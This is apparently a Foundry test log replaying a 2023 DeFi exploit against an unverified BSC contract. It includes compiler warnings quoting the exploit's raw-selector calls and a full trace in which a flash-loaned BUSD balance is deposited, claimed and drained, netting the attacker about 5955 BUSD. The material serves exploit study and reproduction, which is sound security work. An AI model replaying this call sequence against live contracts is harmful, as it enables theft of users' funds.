Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.15s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (9302): Return value of low-level calls not used.
  --> src/test/2023-06/UnverifiedContr_9ad32_exp.sol:33:9:
   |
33 |         address(Vulncontract).call(abi.encodeWithSelector(bytes4(0xe2bbb158), 0,5955466788004705247296));
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Warning (9302): Return value of low-level calls not used.
  --> src/test/2023-06/UnverifiedContr_9ad32_exp.sol:34:9:
   |
34 |         address(Vulncontract).call(abi.encodeWithSelector(bytes4(0xc3490263), 0,5955466788004705247296));
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 249.02ms (102.61µs CPU time)

Ran 1 test for src/test/2023-06/UnverifiedContr_9ad32_exp.sol:Exploit
[PASS] testExploit() (gas: 147160)
Logs:
  [End] Attacker BUSD after exploit: 0.010000000000000000
  [End] Attacker BUSD after exploit: 5955.476788004705247296

Traces:
  [189215] Exploit::testExploit()
    ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 10000000000000000 [1e16]
    ├─ emit log_named_decimal_uint(key: "[End] Attacker BUSD after exploit", val: 10000000000000000 [1e16], decimals: 18)
    ├─ [170175] 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A::flashLoan(0, 1243763239827755213151683 [1.243e24], Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   ├─ [10871] 0x55d398326f99059fF775485246999027B3197955::transfer(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1243763239827755213151683 [1.243e24])
    │   │   ├─ emit Transfer(from: 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A, to: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1243763239827755213151683 [1.243e24])
    │   │   └─ ← [Return] true
    │   ├─ [132967] Exploit::DPPFlashLoanCall(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 1243763239827755213151683 [1.243e24], 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    │   │   ├─ [24562] 0x55d398326f99059fF775485246999027B3197955::approve(0xAC899Ef647533E0dE91E269202f1169d7D47Ae92, 9999000000000000000000 [9.999e21])
    │   │   │   ├─ emit Approval(owner: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xAC899Ef647533E0dE91E269202f1169d7D47Ae92, value: 9999000000000000000000 [9.999e21])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [51763] 0xAC899Ef647533E0dE91E269202f1169d7D47Ae92::deposit(0, 5955466788004705247296 [5.955e21])
    │   │   │   ├─ [7462] 0x55d398326f99059fF775485246999027B3197955::approve(0xAC899Ef647533E0dE91E269202f1169d7D47Ae92, 5955466788004705247296 [5.955e21])
    │   │   │   │   ├─ emit Approval(owner: 0xAC899Ef647533E0dE91E269202f1169d7D47Ae92, spender: 0xAC899Ef647533E0dE91E269202f1169d7D47Ae92, value: 5955466788004705247296 [5.955e21])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [10834] 0x55d398326f99059fF775485246999027B3197955::transferFrom(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xAC899Ef647533E0dE91E269202f1169d7D47Ae92, 5955466788004705247296 [5.955e21])
    │   │   │   │   ├─ emit Transfer(from: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xAC899Ef647533E0dE91E269202f1169d7D47Ae92, value: 5955466788004705247296 [5.955e21])
    │   │   │   │   ├─ emit Approval(owner: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xAC899Ef647533E0dE91E269202f1169d7D47Ae92, value: 4043533211995294752704 [4.043e21])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [35922] 0xAC899Ef647533E0dE91E269202f1169d7D47Ae92::claim(0, 5955466788004705247296 [5.955e21])
    │   │   │   ├─ [24562] 0x55d398326f99059fF775485246999027B3197955::approve(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5955466788004705247296 [5.955e21])
    │   │   │   │   ├─ emit Approval(owner: 0xAC899Ef647533E0dE91E269202f1169d7D47Ae92, spender: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 5955466788004705247296 [5.955e21])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5955466788004705247296 [5.955e21])
    │   │   │   │   ├─ emit Transfer(from: 0xAC899Ef647533E0dE91E269202f1169d7D47Ae92, to: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 5955466788004705247296 [5.955e21])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [8834] 0x55d398326f99059fF775485246999027B3197955::transferFrom(0xAC899Ef647533E0dE91E269202f1169d7D47Ae92, Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5955466788004705247296 [5.955e21])
    │   │   │   ├─ emit Transfer(from: 0xAC899Ef647533E0dE91E269202f1169d7D47Ae92, to: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 5955466788004705247296 [5.955e21])
    │   │   │   ├─ emit Approval(owner: 0xAC899Ef647533E0dE91E269202f1169d7D47Ae92, spender: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
    │   │   │   └─ ← [Return] true
    │   │   ├─ [3271] 0x55d398326f99059fF775485246999027B3197955::transfer(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A, 1243763239827755213151683 [1.243e24])
    │   │   │   ├─ emit Transfer(from: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A, value: 1243763239827755213151683 [1.243e24])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [2531] 0x2170Ed0880ac9A755fd29B2688956BD959F933F8::balanceOf(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A) [staticcall]
    │   │   └─ ← [Return] 7264852556979292191 [7.264e18]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A) [staticcall]
    │   │   └─ ← [Return] 1243763239827755213151683 [1.243e24]
    │   ├─ [531] 0x2170Ed0880ac9A755fd29B2688956BD959F933F8::balanceOf(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A) [staticcall]
    │   │   └─ ← [Return] 7264852556979292191 [7.264e18]
    │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A) [staticcall]
    │   │   └─ ← [Return] 1243763239827755213151683 [1.243e24]
    │   ├─ emit DODOFlashLoan(: Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0, : 1243763239827755213151683 [1.243e24])
    │   └─ ← [Stop] 
    ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(Exploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 5955476788004705247296 [5.955e21]
    ├─ emit log_named_decimal_uint(key: "[End] Attacker BUSD after exploit", val: 5955476788004705247296 [5.955e21], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 278.73ms (939.30µs CPU time)

Ran 2 test suites in 280.84ms (527.75ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
